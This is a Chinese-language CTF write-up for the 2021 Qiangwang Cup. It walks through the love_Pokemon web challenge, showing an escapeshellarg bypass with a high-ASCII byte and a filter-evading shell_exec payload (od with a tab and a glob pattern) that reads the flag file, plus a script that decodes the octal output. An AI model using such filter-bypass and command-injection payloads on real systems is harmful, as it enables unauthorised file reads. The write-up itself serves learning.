#  2021年强网杯WriteUp

> 在这里说一下，本人CTF萌新坐了2天的板凳
>
> 根据别的大佬的Wp进行总结与反思

~~为什么要看我的呢?~~(bushi

因为我是先从开发走的安全，具有一定的基础

然后我会根据当时的情形具体说说我做的题的思路。

##  **love_Pokemon**

```php
if ((!preg_match('/lv100/i',$level)) &&(preg_match('/lv100/i',escapeshellarg($level)))){
		echo file_get_contents('./hint.php');
}
```

这里主要考的是`escapeshellarg`这个函数。

但是我平时没做到这个函数，去搜的话主要讲的是在执行的过程中怎么绕过

但是我们要找的是两者匹配一个能过滤一个不能过滤掉

结果的答案就是：

> escapeshellarg处理后 ASCII 大于 %80的字符会被过滤
>
> levelup=lv%81100就可以拿到`hint.php`

```php
$dream = $_POST["dream"] ?? "";
if(strlen($dream)>=20){
	die("So Big Pokenmon!");
}
ghostpokemon($dream);
	echo shell_exec($dream);
}

// 循环过滤
function ghostpokemon($Pokemon){
	if(is_array($Pokemon)){
		foreach ($Pokemon as $key => $pks) {
			$Pokemon[$key] = DefenderBonus($pks);
}
    
    
// 过滤标准
function DefenderBonus($Pokemon){
if(preg_match("/'|
|_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\"|\
<|\>|\=|{|}|\!|\&|\*|\?|\(|\)/i",$Pokemon)){
			die('catch broken Pokemon! mew-_-two');
}
else{
			return $Pokemon;
}
```

- 判断长度
- 过滤再执行

长度还好说，主要是如何来读取文件

先看看linux读取文件命令：cat tac nl more less head tail od

到[在线网站](https://c.runoob.com/compile/1/)  

```php
<?php
$Pokemon = 'od';
if(preg_match("/'|
|_|\\$|;|l|s|flag|a|t|m|r|e|j|k|n|w|i|\\\\|p|h|u|v|\\+|\\^|\`|\~|\||\"|\
<|\>|\=|{|}|\!|\&|\*|\?|\(|\)/i",$Pokemon)){
	echo 'die';
}
else{
	echo 'pass';
}
?>
```

- od是能过的
- 发现flag中的l与a都是不分大小写过滤了的，则采用正则来`F[@-Z][@-Z]G`
- 拼凑起来 水平定位符号 od%09/F[@-Z][@-Z]G

```php
0000000 066146 063541 050173 070150 051137 031543 030537 057563 0000020 031526 074522 041537 030060 057461 072502 057564 057511 0000040 030154 031566 050137 065557 066545 067157 076576 000012 0000057
```

如何判断进制：

- 0x开头,或者h结尾的是16进制
- 0o开头的是8进制
- 0b开头的是2进制
- 其他是十进制

python进制之间的转换

```python
十进制
使用 int() 函数 ，第一个参数是字符串 '0Xff' ,第二个参数是说明
>>> int('0xf',16) 
>>> int('10100111110',2)      
>>> int('17',8)    
十六进制
>>> hex(1033)
>>> hex(int('101010',2))
>>> hex(int('17',8))
二进制
>>> bin(10)
>>> bin(int('ff',16))
>>> bin(int('17',8))
八进制 oct 函数可将任意进制的数转换成八进制的。
>>> oct(0b1010)        
>>> oct(11)
>>> oct(0xf) 
```

脚本：

将八进制转储转换回字符串

```python
dump = ""
octs = [("0o" + n) for n in  dump.split(" ") if n]
hexs = [int(n, 8) for n in octs]
result = ""
for n in hexs:
    if (len(hex(n)) > 4):
        swapped = hex(((n << 8) | (n >> 8)) & 0xFFFF)
        result += swapped[2:].zfill(4)
print(bytes.fromhex(result).decode())
```

##  easy_pgsql

> 这个我同样做不出来，我当时试了很久，包括猜的是报错盲注
>
> 结果看了Wp才发现终究是自己菜了
>
> 参考链接：https://cn-sec.com/archives/580315.html

- 扫描 我这个都直接忘了 哎～ 没事扫一扫多好 没事抓一抓多好

通过扫描拿到了www.zip 里面是两个pyc文件,还原后阅读源码

其他的话看Wp就能差不多了，挺详细的

###  完美上传器

> 我当时也是试了各种后缀都是上不去的
>
> 结果看了Wp。 ...
>
> 参考链接：https://www.cnblogs.com/twosmi1e/p/15408848.html

笑死～ 



